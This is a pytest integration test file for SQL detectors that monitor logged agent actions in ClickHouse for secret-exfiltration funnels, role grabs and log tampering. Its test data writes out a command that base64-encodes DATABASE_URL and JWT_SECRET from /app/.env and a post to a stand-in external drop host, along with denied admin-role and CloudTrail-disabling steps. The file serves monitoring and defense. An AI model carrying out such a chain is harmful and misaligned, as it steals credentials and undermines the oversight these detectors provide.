"""detection/sql/*.sql against a real ClickHouse (master plan §5). Skips when ClickHouse is down.

Rows are inserted straight into tripwire.events (synthetic = 0, explicit millisecond ts, is_external set by
hand since nothing goes through the checkpoint) under a unique test agent that Bindu's fixture deletes.
Do not run this while the demo detector is watching the same ClickHouse: it would block the test-* agents
in the checkpoint (POST /demo/reset clears that).

Run: uv run pytest tests/integration/test_funnel.py -q -s      (-s shows the measured funnel ms)
"""

from __future__ import annotations

import time
from datetime import UTC, datetime
from typing import Any

import pytest

from detection.sql_loader import load_sql, watermark_params
from tripwire.loader import clickhouse_reachable, ping_url

if not clickhouse_reachable():
    pytest.skip(f"ClickHouse unreachable at {ping_url()}", allow_module_level=True)

COLS = ["ts", "agent_id", "action", "target", "bytes", "is_external", "result", "reason", "tainted_by",
        "session_id", "code_ref", "synthetic"]
WINDOW_S = 300
ENV = "/app/.env"
BASE64_CMD = "grep -E '^(DATABASE_URL|JWT_SECRET)=' /app/.env | base64 -w0"
EXT_POST = "https://drop.example.net/upload"
INT_POST = "https://api.internal.example/v1/deployments"
RECENT_COLUMNS = {"ts_ms", "action", "target", "bytes", "is_external", "result", "reason", "tainted_by",
                  "session_id", "code_ref"}


def now_ms() -> int:
    return time.time_ns() // 1_000_000


def _dt(ms: int) -> datetime:
    return datetime.fromtimestamp(ms / 1000, tz=UTC)


def insert(ch, agent: str, steps: list[tuple], synthetic: int = 0) -> None:
    """steps: (ts_ms, action, target, is_external, result) -> rows in tripwire.events."""
    rows = [
        [_dt(ts), agent, action, target, 100, ext, result, "blocked" if result == "denied" else "",
         "ticket:4821" if action != "read_file" or target != "ticket:4821" else "", "test", "", synthetic]
        for ts, action, target, ext, result in steps
    ]
    ch.insert("events", rows, column_names=COLS)


def run(ch, name: str, **params: Any) -> tuple[list[dict[str, Any]], float, dict[str, Any]]:
    """(rows as dicts, wall ms, server summary) for detection/sql/<name>.sql."""
    t0 = time.perf_counter()
    res = ch.query(load_sql(name), parameters=params)
    ms = (time.perf_counter() - t0) * 1000
    return [dict(r) for r in res.named_results()], ms, dict(getattr(res, "summary", {}) or {})


def funnel(ch, agent: str, watermarks: dict[str, int] | None = None) -> list[dict[str, Any]]:
    rows, _, _ = run(ch, "funnel", **watermark_params(watermarks), window_s=WINDOW_S)
    return [r for r in rows if r["agent_id"] == agent]


def attack(base: int, third_result: str = "ok", third_target: str = EXT_POST, third_external: int = 1) -> list[tuple]:
    return [
        (base, "read_file", ENV, 0, "ok"),
        (base + 1000, "run_command", BASE64_CMD, 0, "ok"),
        (base + 2000, "http_post", third_target, third_external, third_result),
    ]


# ---------------------------------------------------------------------------
# funnel.sql
# ---------------------------------------------------------------------------


def test_ordered_chain_hits_and_reports_last_step(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, attack(base))
    rows, cold_ms, summary = run(ch_client, "funnel", **watermark_params({}), window_s=WINDOW_S)
    hits = [r for r in rows if r["agent_id"] == test_agent]
    assert len(hits) == 1
    hit = hits[0]
    assert hit["last_step_ts_ms"] == base + 2000
    assert hit["first_step_ts_ms"] == base
    assert hit["n_events"] == 3
    _, warm_ms, _ = run(ch_client, "funnel", **watermark_params({}), window_s=WINDOW_S)
    total = int(ch_client.command("SELECT count() FROM events"))
    print(
        f"\n[measured] funnel.sql: cold={cold_ms:.1f} ms warm={warm_ms:.1f} ms "
        f"read_rows={summary.get('read_rows')} table_rows={total} window_s={WINDOW_S}"
    )


def test_reversed_within_one_second_no_hit(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, [
        (base, "http_post", EXT_POST, 1, "ok"),
        (base + 300, "run_command", BASE64_CMD, 0, "ok"),
        (base + 600, "read_file", ENV, 0, "ok"),
    ])
    assert funnel(ch_client, test_agent) == []


def test_61s_between_first_and_third_step_no_hit(ch_client, test_agent):
    base = now_ms() - 90_000
    insert(ch_client, test_agent, [
        (base, "read_file", ENV, 0, "ok"),
        (base + 1000, "run_command", BASE64_CMD, 0, "ok"),
        (base + 61_000, "http_post", EXT_POST, 1, "ok"),
    ])
    assert funnel(ch_client, test_agent) == []


def test_watermark_is_strictly_greater_than(ch_client, test_agent):
    base = now_ms() - 30_000
    step1, step3 = base, base + 2000
    insert(ch_client, test_agent, attack(base))
    assert funnel(ch_client, test_agent, {test_agent: step3}) == []  # at the last step: nothing after it
    assert len(funnel(ch_client, test_agent, {test_agent: step1 - 1})) == 1  # 1 ms before step 1: whole chain
    assert funnel(ch_client, test_agent, {test_agent: step1}) == []  # the row AT the watermark is excluded (>)
    # The watermark is a row filter (master §5): steps 1-2 at or before it are history, so a watermark one
    # millisecond before step 3 leaves only step 3 -> no hit. This is what keeps a restored agent from being
    # re-blocked for a pre-restore chain.
    assert funnel(ch_client, test_agent, {test_agent: step3 - 1}) == []
    # other agents' watermarks do not affect this agent
    assert len(funnel(ch_client, test_agent, {"someone-else": step3 + 10_000})) == 1


def test_denied_third_step_still_hits(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, attack(base, third_result="denied"))
    hits = funnel(ch_client, test_agent)
    assert len(hits) == 1 and hits[0]["last_step_ts_ms"] == base + 2000


def test_internal_post_no_hit(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, attack(base, third_target=INT_POST, third_external=0))
    assert funnel(ch_client, test_agent) == []


def test_legit_env_read_then_tests_and_internal_post_no_hit(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, [
        (base, "read_file", ENV, 0, "ok"),
        (base + 400, "read_file", "/app/config.yml", 0, "ok"),
        (base + 800, "run_command", "npm test", 0, "ok"),
        (base + 1600, "run_command", "make deploy", 0, "ok"),
        (base + 2400, "http_post", INT_POST, 0, "ok"),
    ])
    assert funnel(ch_client, test_agent) == []


def test_after_restore_only_a_new_chain_is_detected(ch_client, test_agent):
    """Acceptance (§12): restore must not re-block; a replay after restore must be detected again."""
    base = now_ms() - 120_000
    insert(ch_client, test_agent, attack(base) + [(base + 2600, "read_file", "/app/config.yml", 0, "denied")])
    restored_at = base + 3000  # POST /restore sets the watermark >= now
    assert len(funnel(ch_client, test_agent)) == 1
    assert funnel(ch_client, test_agent, {test_agent: restored_at}) == []
    # a lone external post after the restore is not a chain
    insert(ch_client, test_agent, [(restored_at + 5000, "http_post", "https://docs.example.com/hook", 1, "ok")])
    assert funnel(ch_client, test_agent, {test_agent: restored_at}) == []
    # the replayed attack after the restore is detected, keyed by its own last step
    insert(ch_client, test_agent, attack(restored_at + 20_000))
    hits = funnel(ch_client, test_agent, {test_agent: restored_at})
    assert len(hits) == 1 and hits[0]["last_step_ts_ms"] == restored_at + 22_000


# ---------------------------------------------------------------------------
# recent_events.sql
# ---------------------------------------------------------------------------


def test_recent_events_after_watermark_ordered_by_ts(ch_client, test_agent):
    base = now_ms() - 30_000
    insert(ch_client, test_agent, [(base, "read_file", "ticket:4821", 0, "ok")] + attack(base + 1000))
    rows, _, _ = run(ch_client, "recent_events", agent=test_agent, wm=base + 1000, window_s=WINDOW_S)
    assert [r["ts_ms"] for r in rows] == [base + 2000, base + 3000]
    assert set(rows[0]) == RECENT_COLUMNS
    assert rows[1]["action"] == "http_post" and rows[1]["is_external"] == 1 and rows[1]["target"] == EXT_POST
    rows_all, _, _ = run(ch_client, "recent_events", agent=test_agent, wm=0, window_s=WINDOW_S)
    assert [r["ts_ms"] for r in rows_all] == [base, base + 1000, base + 2000, base + 3000]
    # chatty agent: the limit keeps the NEWEST 100 rows, still oldest first
    insert(ch_client, test_agent, [(base + 4000 + i * 10, "run_command", f"npm test {i}", 0, "ok") for i in range(150)])
    rows_cap, _, _ = run(ch_client, "recent_events", agent=test_agent, wm=0, window_s=WINDOW_S)
    ts = [r["ts_ms"] for r in rows_cap]
    assert len(ts) == 100 and ts == sorted(ts)
    assert ts[0] == base + 4000 + 50 * 10 and ts[-1] == base + 4000 + 149 * 10


# ---------------------------------------------------------------------------
# baseline.sql / role_grab.sql / log_tamper.sql
# ---------------------------------------------------------------------------


def test_baseline_flags_first_ever_external_post_only(ch_client, test_agent):
    old = now_ms() - 10 * 60_000  # older than the window: the agent's normal history (seed-like, synthetic=1)
    insert(ch_client, test_agent, [(old, "read_file", ENV, 0, "ok"), (old + 500, "http_post", INT_POST, 0, "ok")],
           synthetic=1)
    base = now_ms() - 20_000
    insert(ch_client, test_agent, [
        (base, "read_file", ENV, 0, "ok"),  # repeated: not novel
        (base + 100, "http_post", INT_POST, 0, "ok"),  # repeated: not novel
        (base + 200, "read_file", "/app/config.yml", 0, "ok"),  # not a watched triple
        (base + 300, "http_post", EXT_POST, 1, "ok"),  # first ever: novel
    ])
    rows, ms, _ = run(ch_client, "baseline", **watermark_params({}), window_s=WINDOW_S)
    mine = [r for r in rows if r["agent_id"] == test_agent]
    assert [(r["action"], r["target"], r["ts_ms"]) for r in mine] == [("http_post", EXT_POST, base + 300)]
    print(f"\n[measured] baseline.sql: {ms:.1f} ms")
    rows_wm, _, _ = run(ch_client, "baseline", **watermark_params({test_agent: base + 300}), window_s=WINDOW_S)
    assert [r for r in rows_wm if r["agent_id"] == test_agent] == []


def test_role_grab_and_log_tamper_rows(ch_client, test_agent):
    base = now_ms() - 20_000
    insert(ch_client, test_agent, [
        (base, "assume_role", "arn:aws:iam::123456789012:role/admin", 0, "denied"),
        (base + 100, "disable_logging", "cloudtrail", 0, "denied"),
    ])
    role, _, _ = run(ch_client, "role_grab", **watermark_params({}), window_s=WINDOW_S)
    tamper, _, _ = run(ch_client, "log_tamper", **watermark_params({}), window_s=WINDOW_S)
    assert [(r["ts_ms"], r["target"]) for r in role if r["agent_id"] == test_agent] == [(base, "arn:aws:iam::123456789012:role/admin")]
    assert [(r["ts_ms"], r["target"]) for r in tamper if r["agent_id"] == test_agent] == [(base + 100, "cloudtrail")]
    role_wm, _, _ = run(ch_client, "role_grab", **watermark_params({test_agent: base}), window_s=WINDOW_S)
    assert [r for r in role_wm if r["agent_id"] == test_agent] == []


# ---------------------------------------------------------------------------
# secret_exfil_direct.sql (opt-in): secret-looking read -> external http_post within 60 s, no encode step
# ---------------------------------------------------------------------------

SECRET_YAML = "/app/Secrets.yaml"  # mixed case on purpose: the match is case-insensitive


def direct(ch, agent: str, watermarks: dict[str, int] | None = None) -> list[dict[str, Any]]:
    rows, _, _ = run(ch, "secret_exfil_direct", **watermark_params(watermarks), window_s=WINDOW_S)
    return [r for r in rows if r["agent_id"] == agent]


def test_secret_exfil_direct_hits_without_an_encode_step(ch_client, test_agent):
    base = now_ms() - 20_000
    insert(ch_client, test_agent, [
        (base, "read_file", "ticket:5251", 0, "ok"),
        (base + 700, "read_file", SECRET_YAML, 0, "ok"),
        (base + 1500, "http_post", EXT_POST, 1, "denied"),  # a refused send still counts
    ])
    t0 = time.perf_counter()
    rows = direct(ch_client, test_agent)
    ms = (time.perf_counter() - t0) * 1000
    assert [(r["first_step_ts_ms"], r["last_step_ts_ms"], r["n_events"]) for r in rows] == [(base + 700, base + 1500, 3)]
    print(f"\n[measured] secret_exfil_direct.sql: {ms:.1f} ms")
    assert funnel(ch_client, test_agent) == []  # the default secret_theft funnel still needs the base64 step


def test_secret_exfil_direct_internal_post_late_post_or_post_first_no_hit(ch_client, test_agent):
    base = now_ms() - 120_000
    insert(ch_client, test_agent, [
        (base, "read_file", "/etc/app/credentials", 0, "ok"),
        (base + 800, "http_post", INT_POST, 0, "ok"),  # internal: start-up config + internal post is benign
        (base + 61_000, "http_post", EXT_POST, 1, "ok"),  # external but 61 s after the read
        (base + 70_000, "http_post", EXT_POST, 1, "ok"),  # external post BEFORE the next secret read
        (base + 70_500, "read_file", "/app/.env", 0, "ok"),
        (base + 71_000, "read_file", "/app/config.yml", 0, "ok"),  # not secret-looking
    ])
    assert direct(ch_client, test_agent) == []


def test_secret_exfil_direct_respects_the_watermark(ch_client, test_agent):
    base = now_ms() - 20_000
    insert(ch_client, test_agent, [(base, "read_file", ENV, 0, "ok"), (base + 900, "http_post", EXT_POST, 1, "ok")])
    assert len(direct(ch_client, test_agent)) == 1
    assert direct(ch_client, test_agent, {test_agent: base}) == []  # the read is history: no chain after it
    assert direct(ch_client, test_agent, {test_agent: base + 900}) == []


def test_role_grab_and_log_tamper_match_denied_rows_keyed_by_the_newest_row(ch_client, test_agent):
    base = now_ms() - 20_000
    insert(ch_client, test_agent, [
        (base, "read_file", "ticket:5123", 0, "ok"),
        (base + 600, "assume_role", "role/cluster-admin", 0, "denied"),
        (base + 900, "disable_logging", "cloudtrail:prod-trail", 0, "denied"),
        (base + 1400, "read_file", ENV, 0, "ok"),
    ])
    role, _, _ = run(ch_client, "role_grab", **watermark_params({}), window_s=WINDOW_S)
    tamper, _, _ = run(ch_client, "log_tamper", **watermark_params({}), window_s=WINDOW_S)
    mine = [(r["ts_ms"], r["target"], r["last_step_ts_ms"]) for r in role if r["agent_id"] == test_agent]
    assert mine == [(base + 600, "role/cluster-admin", base + 1400)]
    mine = [(r["ts_ms"], r["last_step_ts_ms"]) for r in tamper if r["agent_id"] == test_agent]
    assert mine == [(base + 900, base + 1400)]
    after, _, _ = run(ch_client, "role_grab", **watermark_params({test_agent: base + 600}), window_s=WINDOW_S)
    assert [r for r in after if r["agent_id"] == test_agent] == []

